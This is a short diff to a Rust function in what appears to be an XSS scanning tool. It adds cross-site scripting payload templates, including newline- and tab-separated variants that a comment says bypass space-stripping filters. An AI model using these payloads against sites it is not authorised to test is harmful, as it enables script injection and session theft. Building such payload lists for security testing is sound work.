@@ -21,10 +21,15 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
         "<details open ontoggle={JS} class={CLASS}>",
         "<iFrAme/src=JaVAsCrIPt:{JS} ClAss={CLASS}>",
         "</<a/href='><svg/onload={JS} claSS={CLASS}>'>",
+        // Newline/tab whitespace variants (bypass space-stripping filters)
+        "<IMG\nsrc=x\nonerror={JS}\nClAss={CLASS}>",
+        "<sVg\nonload={JS}\nclaSS={CLASS}>",
+        "<IMG\tsrc=x\tonerror={JS}\tClAss={CLASS}>",
         // ID
         "<IMG src=x onerror={JS} id={ID}>",
         "<sVg onload={JS} iD={ID}>",
         "<sCrIpt/ID={ID}>{JS}</scRipT>",
+        "<IMG\nsrc=x\nonerror={JS}\nid={ID}>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
